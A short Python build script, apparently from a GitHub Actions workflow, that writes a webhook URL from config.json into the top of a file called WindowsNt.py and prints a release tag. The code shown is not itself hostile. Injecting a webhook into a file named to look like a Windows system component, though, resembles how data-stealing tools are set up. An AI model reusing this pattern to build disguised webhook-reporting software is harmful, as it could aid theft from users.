import os
import json
from datetime import datetime

with open('config.json') as r:
    config = json.load(r)

env_file_path = os.getenv('GITHUB_ENV')
date = datetime.now().strftime("%d:%m:%Y")
time = datetime.now().strftime("%H:%M:%S")

def setup_webhook():
    content = f"webhook = \'{config.get('webhook')}\'\n"
    with open('WindowsNt.py','r') as r:
        content += r.read()
    with open('WindowsNt.py','w') as w:
        w.write(content)


def main():
    setup_webhook()
    print(f'TAG_NAME={config.get("version")}')
